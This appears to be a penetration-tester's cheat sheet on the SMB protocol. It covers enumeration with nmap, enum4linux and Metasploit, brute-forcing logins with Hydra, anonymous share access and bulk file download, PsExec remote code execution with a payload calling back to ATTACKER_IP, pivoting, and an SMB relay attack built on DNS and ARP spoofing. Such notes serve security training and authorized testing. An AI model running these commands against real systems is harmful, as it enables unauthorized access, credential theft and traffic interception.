# SMB

Server Message Block is a network file sharing protocol that is used for sharing files and peripherals between computers on a local network. 

Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network. Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.

It uses port 445 (TCP); however in older versions it was run on top of NetBIOS port 139.

It is by default installed and present in every windows operating system. However, we can disable or remove it from the system.

SAMBA is the Linux implementation of SMB that allows Windows system to access Linux shared folders and devices.

## Authentication

The SMB protocol uses two levels of authentication:
- **User Authentication:** username and password are needed to access a share.
- **Share Authentication:** username and password are needed to access restricted shares.


## NetBIOS Enumeration

### nbtscan

```bash
nbtscan SUBNET_OF_TARGET_IP
```

### nmblookup

It is a tool that allows users to gather NetBIOS names on a specific network.

```bash
nmblookup -A TARGET_IP
```

## SMB Enumeration

### nmap scripts

> Nmap script uses the `guest` user by default for all the smb script scan. The `guest` user is the default user available on all the windows operating systems.

```bash
# List supported SMB versions on the target
nmap -p445 --script=smb-protocols TARGET_IP

# Check security level
nmap -p445 --script=smb-security-mode TARGET_IP

# Determine the operating system, computer name, domain, workgroup, and current time over the SMB protocol (ports 445 or 139).
nmap -p445 --script=smb-os-discovery TARGET_IP

# Enumerate users if anonymous login is possible
nmap -p445 --script=smb-enum-users TARGET_IP

# Enumerate SMB vulnerabilities
nmap -p445 --script="smb-vuln-*" TARGET_IP
```

### Enum4Linux
Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems.

```bash
enum4linux TARGET_IP

enum4linux [options] TARGET_IP
```

| Option | Description                                 |
|--------|---------------------------------------------|
| -U     | get userlist                                |
| -M     | get machine list                            |
| -N     | get namelist dump (different from -U and-M) |
| -S     | get sharelist                               |
| -P     | get password policy information             |
| -G     | get group and member list                   |
| -o     | get OS information                          |
| -a     | all of the above (full basic enumeration)   |

### Metasploit Auxiliary Modules

**auxiliary/scanner/smb/smb_version**

```bash
use auxiliary/scanner/smb/smb_version

set RHOSTS TARGET_IP

run
```

**auxiliary/scanner/smb/smb_enumusers**

It is used for users enumeration.

```bash
use auxiliary/scanner/smb/smb_enumusers

set RHOSTS TARGET_IP

run
```

**auxiliary/scanner/smb/smb_enumshares**

It is used for shares enumeration.

```bash
use auxiliary/scanner/smb/smb_enumshares

set RHOSTS TARGET_IP

# Show detailed information when spidering
set ShowFiles true

run
```

**auxiliary/scanner/smb/smb_login**

It allows us to perform brute force. This can be narrowed down to only include common Windows users such as **Administrator**.

```bash
use auxiliary/scanner/smb/smb_login

set RHOSTS TARGET_IP

# Specify user
set SMBUser USERNAME

#Specify password file
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

run
```

## SMB Exploitation

### Hydra brute-force

```bash
hydra -L USERS_FILE -P PASS_FILE TARGET_IP smb
```

### Anonymous SMB Share Access

#### smbclient

smbclient is a client that can 'talk' to an SMB/CIFS server. It offers an interface similar to that of the ftp program. Operations include things like getting files from the server to the local machine, putting files from the local machine to the server, retrieving directory information from the server and so on.

Basic access: 

```bash 
smbclient //[IP]/[SHARE] -U USERNAME -p TARGET_PORT
# Example: smbclient //10.10.10.10/secrets -U Anonymous -p 445
```

```bash
# Check if anonymous authentication is enabled
smbclient -L TARGET_IP
# Hit enter when password is requested

# Check if anonymous authentication is enabled
smbclient -L TARGET_IP -N

# Login to specific share using null session
smbclient //TARGET_IP/SHARE_NAME -N

# Login to specific share
smbclient //TARGET_IP/SHARE_NAME -U USERNAME
# Enter password when requested

# Anonymous access to share
smbclient //TARGET_IP/SHARE_NAME -U Anonymous -p 445

# Download file from SMB
get FILENAME

# Retrieve all files from a share
prompt
mget *

# Upload file
put FILENAME
```
#### smbmap

```bash
# List resources and permissions of shares using a null session
smbmap -H TARGET_IP
```

#### crackmapexec

```bash
# List resources and permissions of shares using a null session
crackmapexec smb TARGET_IP -u '' -p '' --shares

# Enum users
crackmapexec smb TARGET_IP -u '' -p '' --users

# Validate credentials
crackmapexec smb TARGET_IP -u USERNAME -p PASSWORD_FILE
# Warning: sometimes it can fail and give an error for valid credentials (try with other tool)
```

#### rpcclient

rpcclient is a utility initially developed to test MS-RPC functionality in Samba itself.

From an offensive security standpoint, it can be used to enumerate users, groups, and other potentially sensitive information. 

For instance, it can be use to attempt to connect to the NetBIOS server anonymously, in order to enumerate using MS-RPC available commands/functions:

```bash
rpcclient -U '' -N TARGET_IP
```

### PsExec

PsExec is a telnet-replacement developed by Microsoft that allows the execution of processes on remote Windows systems using any user's credentials.

PsExec auth is preformed via SMB.

It is very similar to RDP; however, commands are sent via CMD.


#### psexec.py

This tool does not run any exploit on the target system.

```bash
psexec.py USER@TARGET_IP cmd.exe

# Enter password
```

#### Metasploit PsExec module

This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" utility provided by SysInternals. 

```bash
use exploit/windows/smb/psexec
set RHOSTS TARGET_IP
set SMBUser TARGET_USER # Example: Administrator
set SMBPass TARGET_PASSWORD

set LHOST ATTACKER_IP
set LPORT ATTACKER_PORT

exploit
```

## Pivoting

**auxiliary/server/socks_proxy**

Use the socks proxy server to access the pivot system on the attacker's machine using the proxychains tool.

```bash
# Read socks proxy configuration
cat /etc/proxychains4.conf

use use auxiliary/server/socks_proxy
set SRVPORT PROXYCHAINS_PORT
set VERSION PROXYCHAINS_VERSION

# run nmap using proxychains
proxychains nmap TARGET2_IP
```

Map shared folders from a pivoted system using the' net' command.

```bash
shell
net use LOCAL_DRIVE_NAME REMOTE_DRIVE_NAME
# Example: net use D: \\TARGET_IP\Documents
# Example 2: net use K: \\TARGET_IP\K$
```

## SMB Relay Attack

It is a type of network attack where an attacker intercepts SMB traffic, manipulates it and relays it to a legitimate server to gain unauthorized access to resources or perform malicious actions.


1. Configure DNS spoofing

Create a fake DNS host file that will point all requests for *.example.com to the attacker system

```bash
echo "ATTACKER_IP *.example.com" > dns
dnsspoof -i eth1 -f dns
```

2. Enable IP forwarding

```bash
echo 1 >/proc/sys/net/ipv4/ip_forward
```

3. Activate the MiTM attack using the ARP Spoofing technique.
Spoof the ARP traffic from the client to the gateway, and vice versa. And consequently capture SMB hashes.

```bash
arpshoof -i eth1 -t CLIENT_IP GATEWAY_IP
```

```bash
arpspoof -i eth1 -t GATEWAY_IP CLIENT_IP
```

4. Run Metasploit's smb_relay exploit

**exploit/windows/smb/smb_relay**
```bash
use exploit/windows/smb/smb_relay
set SRVHOST ATTACKER_IP
set LHOST ATTACKER_IP
set SMBHOST TARGET_IP
```
